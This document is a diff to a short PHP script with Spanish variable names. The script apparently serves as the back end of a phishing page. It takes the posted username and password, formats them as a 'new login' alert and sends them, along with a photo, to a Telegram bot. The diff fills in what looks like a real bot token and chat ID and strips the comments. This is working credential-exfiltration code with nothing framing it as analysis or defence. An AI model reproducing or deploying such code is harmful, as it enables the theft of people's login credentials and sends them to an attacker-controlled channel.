@@ -1,6 +1,6 @@
 <?php
-$botToken = "PON_AQUI_TU_TOKEN";
-$chatId = "PON_AQUI_TU_CHAT_ID";
+$botToken = "8970164569:AAHOOx1f8hY89dMDjsCl_H8AjWe33g7R9pc";
+$chatId = "-1004395775315";
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $usuario = $_POST['usuario'];
@@ -9,10 +9,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
     $mensaje = "🚨 NUEVO LOGIN 🚨\nUsuario: " . $usuario . "\nClave: " . $clave;
 
-    // Enviar mensaje
     file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($mensaje));
 
-    // Enviar foto
     $url = "https://api.telegram.org/bot$botToken/sendPhoto";
     $post = [
         'chat_id' => $chatId,
